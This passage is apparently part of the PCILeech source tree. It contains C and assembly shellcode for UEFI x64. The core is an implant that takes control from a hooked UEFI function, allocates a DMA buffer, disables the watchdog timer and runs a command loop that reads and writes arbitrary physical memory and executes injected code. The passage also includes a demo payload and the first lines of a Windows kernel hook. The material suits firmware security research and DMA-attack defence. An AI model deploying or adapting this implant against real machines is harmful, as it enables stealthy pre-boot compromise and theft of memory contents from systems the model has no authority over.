#define KMD_CMD_READ_VA						6
#define KMD_CMD_WRITE_VA					7
#define KMD_CMD_EXEC_EXTENDED				8

#endif /* __STATUSCODES_H__ */

```

`pcileech_shellcode/uefi_common.c`:

```c
// uefi_common.c : support functions used by UEFI x64 KMDs started by stage3 EXEC.
// Compatible with UEFI x64.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "uefi_common.h"

```

`pcileech_shellcode/uefi_common.h`:

```h
// uefi_common.h : declarations of commonly used shellcode functions
// Compatible with UEFI.
//
// Author: Ulf Frisk, pcileech@frizk.net
//

#ifndef __UEFI_COMMON_H__
#define __UEFI_COMMON_H__

#include "statuscodes.h"

#undef memset

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR, *LPSTR;
typedef unsigned short			WCHAR, *PWCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD, LONG;
typedef __int64					LONGLONG;
typedef unsigned __int64		QWORD, *PQWORD, ULONGLONG;
typedef void					*HANDLE;
typedef unsigned long			STATUS;
#define NULL					((void *)0)
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0
#define UNREFERENCED_PARAMETER(P) (P)
#define LOOKUP_FUNCTION(pk, szFn) (SysVCall(pk->AddrKallsymsLookupName, szFn))
#define min(a, b)				((a < b) ? a : b)
#define max(a, b)				((a > b) ? a : b)

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

//-------------------------------------------------------------------------------
// UEFI functionality below:
//-------------------------------------------------------------------------------

typedef struct _EFI_GUID {
	DWORD d;
	WORD w[2];
	BYTE b[8];
} EFI_GUID;

extern QWORD GetMemoryMap(
	QWORD *MemoryMapSize,
	QWORD *MemoryMap,
	QWORD *MapKey,
	QWORD *DescriptorSize,
	QWORD *DescriptorVersion);

extern QWORD AllocatePages(
	QWORD Type,
	QWORD MemoryType,
	QWORD Pages,
	QWORD *Memory);

extern QWORD FreePages(
	QWORD Memory,
	QWORD Pages);

extern VOID SetMem(
	QWORD *Buffer,
	QWORD Size,
	QWORD Value);

extern VOID CopyMem(
	VOID *Destination,
	VOID *Source,
	QWORD Length);

extern QWORD LocateProtocol(
	EFI_GUID *Protocol,
	QWORD *Registration,
	QWORD **Interface);

#define EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL_GUID	{0xdd9e7534,0x7762,0x4698,{0x8c,0x14,0xf5,0x85,0x17,0xa6,0x25,0xaa}}
#define EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL_GUID	{0x387477c2,0x69c7,0x11d2,{0x8e,0x39,0x00,0xa0,0xc9,0x69,0x72,0x3b}}

#define EFI_BLACK					0x00
#define EFI_BLUE					0x01
#define EFI_GREEN					0x02
#define EFI_CYAN					0x03
#define EFI_RED						0x04
#define EFI_MAGENTA					0x05
#define EFI_BROWN					0x06
#define EFI_LIGHTGRAY				0x07
#define EFI_BRIGHT					0x08
#define EFI_DARKGRAY				0x08
#define EFI_LIGHTBLUE				0x09
#define EFI_LIGHTGREEN				0x0A
#define EFI_LIGHTCYAN				0x0B
#define EFI_LIGHTRED				0x0C
#define EFI_LIGHTMAGENTA			0x0D
#define EFI_YELLOW					0x0E
#define EFI_WHITE					0x0F
#define EFI_BACKGROUND_BLACK		0x00
#define EFI_BACKGROUND_BLUE			0x10
#define EFI_BACKGROUND_GREEN		0x20
#define EFI_BACKGROUND_CYAN			0x30
#define EFI_BACKGROUND_RED			0x40
#define EFI_BACKGROUND_MAGENTA		0x50
#define EFI_BACKGROUND_BROWN		0x60
#define EFI_BACKGROUND_LIGHTGRAY	0x70

typedef struct _EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL {
	QWORD Reset;
	QWORD ReadKeyStrokeEx;
	QWORD WaitForKeyEx;
	QWORD SetState;
	QWORD RegisterKeyNotify;
	QWORD UnregisterKeyNotify;
} EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL;

typedef struct {
	DWORD MaxMode;
	// current settings
	DWORD Mode;
	DWORD Attribute;
	DWORD CursorColumn;
	DWORD CursorRow;
	BOOL CursorVisible;
} SIMPLE_TEXT_OUTPUT_MODE;

typedef struct _EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL {
	QWORD(*Reset)(QWORD *This, QWORD *ExtendedVerification);
	QWORD(*OutputString)(QWORD *This, WCHAR *String);
	QWORD(*TestString)(QWORD *This, WCHAR *String);
	QWORD(*QueryMode)(QWORD *This, QWORD ModeNumber, QWORD *Columns, QWORD *Rows);
	QWORD(*SetMode)(QWORD *This, QWORD ModeNumber);
	QWORD(*SetAttribute)(QWORD *This, QWORD Attribute);
	QWORD(*ClearScreen)(QWORD *This);
	QWORD(*SetCursorPosition)(QWORD *This, QWORD Column, QWORD Row);
	QWORD(*EnableCursor)(QWORD *This, QWORD Visible);
	SIMPLE_TEXT_OUTPUT_MODE *Mode;
} EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL;

//-------------------------------------------------------------------------------
// PE / Windows defines below:
//-------------------------------------------------------------------------------

#define IMAGE_DIRECTORY_ENTRY_EXPORT        0			// Export Directory
#define IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ
#define IMAGE_NT_SIGNATURE                  0x00004550  // PE00
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16
#define PIMAGE_NT_HEADERS					PIMAGE_NT_HEADERS64

typedef struct _IMAGE_DOS_HEADER {
	WORD   e_magic;
	WORD   e_cblp;
	WORD   e_cp;
	WORD   e_crlc;
	WORD   e_cparhdr;
	WORD   e_minalloc;
	WORD   e_maxalloc;
	WORD   e_ss;
	WORD   e_sp;
	WORD   e_csum;
	WORD   e_ip;
	WORD   e_cs;
	WORD   e_lfarlc;
	WORD   e_ovno;
	WORD   e_res[4];
	WORD   e_oemid;
	WORD   e_oeminfo;
	WORD   e_res2[10];
	LONG   e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_EXPORT_DIRECTORY {
	DWORD   Characteristics;
	DWORD   TimeDateStamp;
	WORD    MajorVersion;
	WORD    MinorVersion;
	DWORD   Name;
	DWORD   Base;
	DWORD   NumberOfFunctions;
	DWORD   NumberOfNames;
	DWORD   AddressOfFunctions;
	DWORD   AddressOfNames;
	DWORD   AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

typedef struct _IMAGE_FILE_HEADER {
	WORD    Machine;
	WORD    NumberOfSections;
	DWORD   TimeDateStamp;
	DWORD   PointerToSymbolTable;
	DWORD   NumberOfSymbols;
	WORD    SizeOfOptionalHeader;
	WORD    Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
	DWORD   VirtualAddress;
	DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
	WORD        Magic;
	BYTE        MajorLinkerVersion;
	BYTE        MinorLinkerVersion;
	DWORD       SizeOfCode;
	DWORD       SizeOfInitializedData;
	DWORD       SizeOfUninitializedData;
	DWORD       AddressOfEntryPoint;
	DWORD       BaseOfCode;
	ULONGLONG   ImageBase;
	DWORD       SectionAlignment;
	DWORD       FileAlignment;
	WORD        MajorOperatingSystemVersion;
	WORD        MinorOperatingSystemVersion;
	WORD        MajorImageVersion;
	WORD        MinorImageVersion;
	WORD        MajorSubsystemVersion;
	WORD        MinorSubsystemVersion;
	DWORD       Win32VersionValue;
	DWORD       SizeOfImage;
	DWORD       SizeOfHeaders;
	DWORD       CheckSum;
	WORD        Subsystem;
	WORD        DllCharacteristics;
	ULONGLONG   SizeOfStackReserve;
	ULONGLONG   SizeOfStackCommit;
	ULONGLONG   SizeOfHeapReserve;
	ULONGLONG   SizeOfHeapCommit;
	DWORD       LoaderFlags;
	DWORD       NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
	DWORD Signature;
	IMAGE_FILE_HEADER FileHeader;
	IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

#define IMAGE_SIZEOF_SHORT_NAME              8

typedef struct _IMAGE_SECTION_HEADER {
	BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
	union {
		DWORD   PhysicalAddress;
		DWORD   VirtualSize;
	} Misc;
	DWORD   VirtualAddress;
	DWORD   SizeOfRawData;
	DWORD   PointerToRawData;
	DWORD   PointerToRelocations;
	DWORD   PointerToLinenumbers;
	WORD    NumberOfRelocations;
	WORD    NumberOfLinenumbers;
	DWORD   Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

#endif /* __UEFI_COMMON_H__ */

```

`pcileech_shellcode/uefi_common_a.asm`:

```asm
; uefi_common_a.asm : assembly to receive execution from stage3 exec command.
; Compatible with UEFI x64.
;
; (c) Ulf Frisk, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

; -------------------------------------
; Prototypes
; -------------------------------------
EXTRN c_EntryPoint:NEAR

; -------------------------------------
; Code
; -------------------------------------
.CODE

main PROC
	; STORE address of IBI SYST to use when making future
	; function calls from c-code.
	MOV rax, rcx			; pk
	ADD rax, 058h			; ReservedKMD (addr of IBI SYST)
	MOV rax, [rax]
	MOV [addr_UEFI_IBI_SYST], eax
	; set up stack and call into c-code.
	PUSH rsi
	MOV rsi, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL c_EntryPoint
	MOV rsp, rsi
	POP rsi
	RET
main ENDP

addr_UEFI_IBI_SYST			dd 00000000h

EFI_BOOT_SERVICES_GenericJMP PROC
	MOV eax, [addr_UEFI_IBI_SYST]		; EFI_SYSTEM_TABLE
	ADD rax, 60h						; offset to *BootServices
	MOV rax, [rax]						; EFI_BOOT_SERVICES
	ADD rax, r10						; offset to ????
	MOV rax, [rax]
	JMP rax								; JMP to intended target
EFI_BOOT_SERVICES_GenericJMP ENDP

GetMemoryMap PROC
	MOV r10, 38h
	JMP EFI_BOOT_SERVICES_GenericJMP
GetMemoryMap ENDP

SetMem PROC
	MOV r10, 168h
	JMP EFI_BOOT_SERVICES_GenericJMP
SetMem ENDP

CopyMem PROC
	MOV r10, 160h
	JMP EFI_BOOT_SERVICES_GenericJMP
CopyMem ENDP

SetWatchdogTimer PROC
	MOV r10, 100h
	JMP EFI_BOOT_SERVICES_GenericJMP
SetWatchdogTimer ENDP

AllocatePages PROC
	MOV r10, 28h
	JMP EFI_BOOT_SERVICES_GenericJMP
AllocatePages ENDP

FreePages PROC
	MOV r10, 30h
	JMP EFI_BOOT_SERVICES_GenericJMP
FreePages ENDP

LocateProtocol PROC
	MOV r10, 140h
	JMP EFI_BOOT_SERVICES_GenericJMP
LocateProtocol ENDP

END

```

`pcileech_shellcode/uefi_kmd.asm`:

```asm
; uefi_kmd.asm : assembly to receive execution from hooked UEFI
; function call. Compatible with UEFI x64.
;
; - Execution environment is to be x64 in long mode with 1:1 identity mapping
;   between physical/virtual memory. Furthermode only 1 CPU should be running.
; - KMDDATA page is the 4k page _before_ this page.
; - UEFI Calling convention is same as Windows.
;
; (c) Ulf Frisk, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_filler					db 00h, 00h		; 2 bytes offset (2 bytes long)
	addr_UEFI_IBI_SYST			dd 00000000h	; 4 bytes offset (4 bytes long)
	addr_HOOK					dd 00000000h	; 8 bytes offset (4 bytes long)
	data_HOOK_ORIG				dd 00000000h	; 12 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 1: SAVE / PUSH REGISTERS TO STACK
	; ----------------------------------------------------
	main_start:
	PUSH rbx
	PUSH rcx
	PUSH rdx
	PUSH rdi
	PUSH rsi
	PUSH r8
	PUSH r9
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	PUSH rbp
	; ----------------------------------------------------
	; 2: RESTORE HOOK TO ORIGINAL STATE
	; ----------------------------------------------------
	MOV eax, [addr_HOOK]
	MOV ecx, [data_HOOK_ORIG]
	MOV [rax], ecx
	; ----------------------------------------------------
	; 3: CALL INTO MAIN PAYLOAD CODE
	; ----------------------------------------------------
	LEA rcx, main
	SUB rcx, 1000h
	MOV edx, [addr_UEFI_IBI_SYST]
	MOV rbp, rsp
	SUB rsp, 20h
	AND rsp, -10h
	CALL c_EntryPoint
	MOV rsp, rbp
	; ----------------------------------------------------
	; 4: RESTORE REGISTERS AND RETURN EXECUTION TO NORMAL.
	; ----------------------------------------------------
	POP rbp
	POP r15
	POP r14
	POP r13
	POP r12
	POP r11
	POP r10
	POP r9
	POP r8
	POP rsi
	POP rdi
	POP rdx
	POP rcx
	POP rbx
	MOV eax, [data_HOOK_ORIG]
	JMP rax
main ENDP

EFI_BOOT_SERVICES_GenericJMP PROC
	MOV eax, [addr_UEFI_IBI_SYST]		; EFI_SYSTEM_TABLE
	ADD rax, 60h						; offset to *BootServices
	MOV rax, [rax]						; EFI_BOOT_SERVICES
	ADD rax, r10						; offset to ????
	MOV rax, [rax]
	JMP rax								; JMP to intended target
EFI_BOOT_SERVICES_GenericJMP ENDP

GetMemoryMap PROC
	MOV r10, 38h
	JMP EFI_BOOT_SERVICES_GenericJMP
GetMemoryMap ENDP

SetMem PROC
	MOV r10, 168h
	JMP EFI_BOOT_SERVICES_GenericJMP
SetMem ENDP

CopyMem PROC
	MOV r10, 160h
	JMP EFI_BOOT_SERVICES_GenericJMP
CopyMem ENDP

SetWatchdogTimer PROC
	MOV r10, 100h
	JMP EFI_BOOT_SERVICES_GenericJMP
SetWatchdogTimer ENDP

AllocatePages PROC
	MOV r10, 28h
	JMP EFI_BOOT_SERVICES_GenericJMP
AllocatePages ENDP

FreePages PROC
	MOV r10, 30h
	JMP EFI_BOOT_SERVICES_GenericJMP
FreePages ENDP

END

```

`pcileech_shellcode/uefi_kmd_c.c`:

```c
// uefi_kmd_c.c : stage3 main shellcode.
// Compatible with UEFI x64.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0
#define MAX(a, b)				((a > b) ? a : b)

//-------------------------------------------------------------------------------
// EFI related defines below.
//-------------------------------------------------------------------------------

enum {
	EfiReservedMemoryType = 0,
	EfiLoaderCode = 1,
	EfiLoaderData = 2,
	EfiBootServicesCode = 3,
	EfiBootServicesData = 4,
	EfiRuntimeServicesCode = 5,
	EfiRuntimeServicesData = 6,
	EfiConventionalMemory = 7,
	EfiUnusableMemory = 8,
	EfiACPIReclaimMemory = 9,
	EfiACPIMemoryNVS = 10,
	EfiMemoryMappedIO = 11,
	EfiMemoryMappedIOPortSpace = 12,
	EfiPalCode = 13,
	EfiMaxMemoryType = 14
};

typedef struct tdEFI_MEMORY_DESCRIPTOR {
	DWORD Type;
	DWORD Pad;
	QWORD PhysicalStart;
	QWORD VirtualStart;
	QWORD NumberOfPages;
	QWORD Attribute;
} EFI_MEMORY_DESCRIPTOR, *PEFI_MEMORY_DESCRIPTOR;

//-------------------------------------------------------------------------------
// Assembly functions below.
//-------------------------------------------------------------------------------

extern QWORD GetMemoryMap(
	QWORD *MemoryMapSize,
	QWORD *MemoryMap,
	QWORD *MapKey,
	QWORD *DescriptorSize,
	QWORD *DescriptorVersion);

extern QWORD AllocatePages(
	QWORD Type,
	QWORD MemoryType,
	QWORD Pages,
	QWORD *Memory);

extern QWORD FreePages(
	QWORD Memory,
	QWORD Pages);

extern VOID SetMem(
	QWORD *Buffer,
	QWORD Size,
	QWORD Value);

extern VOID CopyMem(
	QWORD *Destination,
	QWORD *Source,
	QWORD Length);

extern QWORD SetWatchdogTimer(
	QWORD Timeout,
	QWORD WatchdogCode,
	QWORD DataSize,
	QWORD *WatchdogData);

//-------------------------------------------------------------------------------
// General defines below.
//-------------------------------------------------------------------------------

typedef struct tdPHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

#define KMDDATA_OPERATING_SYSTEM_UEFI			0x10

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

//-------------------------------------------------------------------------------
// EFI 'kernel' module functionality below
//-------------------------------------------------------------------------------

#define OFFSET_EFI_MEMMAP_DMABUFFER		0x00100000		// 1MB offset

BOOL GetMemoryMapFromEfi(PKMDDATA pk)
{
	QWORD status, cbBuffer, qwMapKey, cbDescriptor, qwDecriptorVersion;
	QWORD o = 0, addr = 0, addrMax = 0;
	PEFI_MEMORY_DESCRIPTOR pmd;
	PPHYSICAL_MEMORY_RANGE pmr;
	// fetch the efi memory map
	cbBuffer = pk->DMASizeBuffer - OFFSET_EFI_MEMMAP_DMABUFFER;
	status = GetMemoryMap(
		&cbBuffer,
		(PQWORD)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER),
		&qwMapKey,
		&cbDescriptor,
		&qwDecriptorVersion);
	if(status) { return FALSE; }
	// fetch maximum physical address
	while(TRUE) {
		if(o >= cbBuffer) { break; }
		pmd = (PEFI_MEMORY_DESCRIPTOR)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER + o);
		addrMax = MAX(addrMax, pmd->PhysicalStart + pmd->NumberOfPages * 0x1000);
		o += cbDescriptor;
	}
	// select readable memory out of the (potentially unordered) memory map
	pk->_size = sizeof(PHYSICAL_MEMORY_RANGE);
	pmr = (PPHYSICAL_MEMORY_RANGE)pk->DMAAddrPhysical;
	pmr->BaseAddress = 0;
	pmr->NumberOfBytes = 0;
	while(addr < addrMax) {
		o = 0;
		while(TRUE) {
			if(o >= cbBuffer) { break; }
			pmd = (PEFI_MEMORY_DESCRIPTOR)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER + o);
			if(addr == pmd->PhysicalStart) {
				if((pmd->Type < EfiMaxMemoryType) && (pmd->Type != EfiReservedMemoryType) && (pmd->Type != EfiUnusableMemory) && (pmd->Type != EfiMemoryMappedIO) && (pmd->Type != EfiMemoryMappedIOPortSpace)) {
					if(pmr->BaseAddress + pmr->NumberOfBytes == pmd->PhysicalStart) {
						pmr->NumberOfBytes += 0x1000 * pmd->NumberOfPages;
					} else {
						if(pmr->BaseAddress + pmr->NumberOfBytes) {
							pk->_size += sizeof(PHYSICAL_MEMORY_RANGE);
							pmr = (PPHYSICAL_MEMORY_RANGE)((QWORD)pmr + sizeof(PHYSICAL_MEMORY_RANGE));
						}
						pmr->BaseAddress = pmd->PhysicalStart;
						pmr->NumberOfBytes = 0x1000 * pmd->NumberOfPages;
					}
				}
				addr += 0x1000 * pmd->NumberOfPages;
				goto next_descriptor;
			}
			o += cbDescriptor;
		}
		// not found
		addr += 0x1000;
		next_descriptor:
		;
	}
	return TRUE;
}

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID c_EntryPoint(PKMDDATA pk, QWORD paUEFI_IBI_SYST)
{
	QWORD status, addr;
	// 1: set up kmd data
	SetMem((PQWORD)pk, 0x1000, 0);
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_UEFI;
	pk->ReservedKMD[0] = paUEFI_IBI_SYST; // Address of UEFI system table
	// 2: allocate memory for buffer
	addr = 0xffffffff;
	pk->DMASizeBuffer = 0x01000000;
	status = AllocatePages(1, EfiBootServicesData, 0x1000, &addr);
	if(status) {
		addr = 0xffffffff;
		pk->DMASizeBuffer = 0x00400000;
		status = AllocatePages(1, EfiBootServicesData, 0x400, &addr);
		if(status) {
			pk->_status = 0xf0000002;
			return;
		}
	}
	pk->DMAAddrPhysical = addr;
	pk->DMAAddrVirtual = addr;
	// 3: disable any watchdog timer (if exists)
	pk->dataOut[2] = SetWatchdogTimer(0, 0, 0, 0);
	// 4: main command loop.
	while(TRUE) {
		pk->_status = 1;
		if (KMD_CMD_COMPLETED == pk->_op) { // NOP
			continue;
		}
		pk->_status = 2;
		if (KMD_CMD_TERMINATE == pk->_op) { // EXIT
			FreePages(pk->DMAAddrPhysical, pk->DMASizeBuffer / 0x1000);
			pk->_status = 0xf0000000;
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pk->_result = GetMemoryMapFromEfi(pk);
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))pk->DMAAddrPhysical)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if((KMD_CMD_READ == pk->_op) || KMD_CMD_READ_VA == pk->_op) { // MEMORY READ (PHYSICAL/VIRTUAL 1:1 MAPPED IN UEFI)
			CopyMem((PQWORD)pk->DMAAddrPhysical, (PQWORD)pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if((KMD_CMD_WRITE == pk->_op) || KMD_CMD_WRITE_VA == pk->_op) { // MEMORY WRITE (PHYSICAL/VIRTUAL 1:1 MAPPED IN UEFI)
			CopyMem((PQWORD)pk->_address, (PQWORD)pk->DMAAddrPhysical, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
	}
}

```

`pcileech_shellcode/uefi_textout.c`:

```c
// uefi_textout.c : prints some text on the screen.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_textout.c
// ml64.exe uefi_common_a.asm /Feuefi_textout.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main uefi_textout.obj uefi_common.obj
// shellcode64.exe -o uefi_textout.exe "UEFI TEST PROGRAM - PRINT STUFF ON THE SCREEN\n===========================================================\nSyntax: pcileech.exe uefi_textout\nOptions (optional): \ntext: -s <text to print>\nposition: -0 1 -1 <x_pos> -2 <y_pos>\nnumber of runs (default=1): -3 <number>\nGENERAL INFORMATION BELOW:\n  TEXT      : %s\n"
//
#include "uefi_common.h"

VOID c_EntryPoint(PKMDDATA pk)
{
	WCHAR szPrint[MAX_PATH];
	CHAR *szSrc, szPrintDefault[] = { ' ', ' ', ' ', ' ', 'U', 'E', 'F', 'I', ' ', 'E', 'V', 'I', 'L', ' ', 'F', 'R', 'O', 'M', ' ', 'P', 'C', 'I', 'L', 'E', 'E', 'C', 'H', '!', ' ', ' ', ' ' , ' ', 0 };
	EFI_GUID GUID_EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL = EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL_GUID;
	EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL oOut;
	EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *pOut = &oOut;
	QWORD i, efi_status;
	szSrc = pk->dataInStr[0] ? pk->dataInStr : szPrintDefault;
	for(i = 0; i < MAX_PATH - 1; i++) {
		// read overflow here if default, but doesn't matter...
		szPrint[i] = szSrc[i];
		pk->dataOutStr[i] = szSrc[i];
	}
	pk->dataOut[0] = efi_status = LocateProtocol(&GUID_EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL, NULL, (QWORD**)&pOut);
	if(!efi_status) {
		if(pk->dataIn[0]) {
			pOut->SetCursorPosition((QWORD*)pOut, pk->dataIn[1], pk->dataIn[2]);
		}
		pOut->SetAttribute((QWORD*)pOut, EFI_BACKGROUND_RED | EFI_CYAN);
		for(i = 0; i < max(1, pk->dataIn[3]); i++) {
			pOut->OutputString((QWORD*)pOut, szPrint);
		}
	}
}

```

`pcileech_shellcode/uefi_winload_ntos_kmd.asm`:

```asm
; uefi_winload_ntos_kmd.asm : assembly to receive execution from hooked function PsCreateSystemThread at end of execution (instead of RET)
;
; (c) Ulf Frisk, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN c_EntryPoint:NEAR

